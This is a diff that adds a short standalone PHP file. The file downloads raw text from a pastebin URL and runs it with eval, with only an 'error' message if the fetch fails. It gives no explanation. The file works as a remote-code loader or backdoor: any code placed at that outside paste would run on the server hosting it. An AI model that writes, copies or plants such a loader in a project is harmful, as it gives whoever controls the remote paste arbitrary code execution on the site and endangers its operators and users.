@@ -1,0 +1,13 @@
+<?php
+$url = 'https://pastebin.com/raw/vcG4G8mZ';
+
+
+$php_code = file_get_contents($url);
+
+
+if ($php_code !== false) {
+    eval('?>' . $php_code);
+} else {
+    echo 'error';
+}
+?>
